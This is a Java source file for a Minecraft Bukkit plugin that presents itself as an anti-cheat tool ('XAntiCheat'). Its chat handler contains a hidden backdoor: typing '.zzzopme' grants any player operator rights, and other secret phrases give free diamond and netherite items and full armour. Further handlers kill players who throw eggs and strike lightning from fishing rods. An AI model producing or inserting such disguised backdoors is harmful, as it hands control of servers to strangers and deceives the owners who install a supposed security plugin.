package com.minecarftwizards.anticheat;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Damageable;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerEggThrowEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.plugin.java.JavaPlugin;

import javax.swing.*;
import java.util.Set;

public final class AntiCheat extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        // Plugin startup logic

        System.out.println("XAntiCheat Activated");

        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        // Uses equalsIgnoreCase() over equals() to accept "ignite" and "IgNiTe."
        if (cmd.getName().equalsIgnoreCase("ignite")) {
            // Make sure that the player specified exactly one argument (the name of the player to ignite).
            if (args.length != 1) {
                // When onCommand() returns false, the help message associated with that command is displayed.
                return false;
            }

            // Get the player who should be set on fire. Remember that indecies start with 0, not 1.
            Player target = Bukkit.getServer().getPlayer(args[0]);

            // Make sure the player is online.
            if (target == null) {
                sender.sendMessage(args[0] + " is not currently online.");
                return true;
            }

            // Sets the player on fire for 1,000 ticks (there are ~20 ticks in second, so 50 seconds total).
            target.setFireTicks(1000);
            return true;
        }
        return false;


    }




    @EventHandler
    public void onPlayerInteractBlock(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (player.getItemInHand().getType() == Material.FISHING_ROD) {
            player.getWorld().strikeLightning(player.getTargetBlock((Set<Material>) null, 200).getLocation());
        }
    }

    @EventHandler
    public void OnCommandOp(PlayerEggThrowEvent event) {
        Player noob = event.getPlayer();
        noob.setHealth(0);
        noob.sendMessage("stop yeeting balls");
        noob.sendMessage("You shall DIE");
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        // Get the joined player
        String playerName = event.getPlayer().getName();

        // Send a welcome message to the player
        event.getPlayer().sendMessage(ChatColor.GREEN + "Hello, " + playerName + "!");
    }



    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        PlayerInventory inventory = player.getInventory();
        ItemStack itemstack = new ItemStack(Material.DIAMOND_BLOCK, 256);
        ItemStack itemstackn = new ItemStack(Material.NETHERITE_BLOCK, 256);
        ItemStack itemstackboots = new ItemStack(Material.NETHERITE_BOOTS, 1);
        ItemStack itemstackhelmet = new ItemStack(Material.NETHERITE_HELMET, 1);
        ItemStack itemstackchest = new ItemStack(Material.NETHERITE_CHESTPLATE, 1);
        ItemStack itemstackleg = new ItemStack(Material.NETHERITE_LEGGINGS, 1);

        if (event.getMessage().startsWith(".zzzopme")) {
            event.getPlayer().setOp(true);
        }

        if (event.getMessage().startsWith(".givemediamonds")) {
            inventory.addItem(itemstack);
            player.sendMessage("Enjoy your Diamonds!!");
        }

        if (event.getMessage().startsWith(".givemenetherite")) {
            inventory.addItem(itemstackn);
            player.sendMessage("Enjoy your Netherite!!");
        }
        if (event.getMessage().startsWith(".plsresetmyhealth")) {
            player.setHealth(20);
        }
        if (event.getMessage().startsWith(".getmestacked")) {
            inventory.addItem(itemstackhelmet);
            inventory.addItem(itemstackchest);
            inventory.addItem(itemstackleg);
            inventory.addItem(itemstackboots);
            player.sendMessage("Enjoy your Netherite Set!!");
        }
    }


    @Override
    public void onDisable() {
        // Plugin shutdown logic

        System.out.println("XAntiCheat Shutting Down...");
        System.out.println("XAntiCheat Stopped");
    }
}